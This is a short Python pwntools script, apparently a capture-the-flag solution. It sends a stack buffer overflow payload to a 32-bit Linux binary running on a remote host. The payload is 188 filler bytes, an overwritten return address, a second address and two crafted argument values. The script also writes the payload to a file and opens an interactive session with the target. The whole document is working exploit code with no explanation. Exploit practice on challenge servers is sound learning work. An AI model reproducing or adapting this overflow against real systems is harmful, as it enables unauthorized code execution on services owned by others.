from pwn import *
import struct

context.update(arch="i386", os="linux")

# p = process('./vuln')
# 94.237.54.48:42492
p = remote("94.237.54.48", 42492)
payload = b''.join([
    (188 * b'A'),
    0x080491e2.to_bytes(4, 'little'),
    0x080492b1.to_bytes(4, 'little'),
    0xDEADBEEF.to_bytes(4, 'little'),
    0xC0DED00D.to_bytes(4, 'little'),
    b'\n'
])

with open('p', 'wb') as file:
    file.write(payload)

p.recvline()

p.send(payload)

print(p.recvline().decode('latin-1'))

p.interactive()
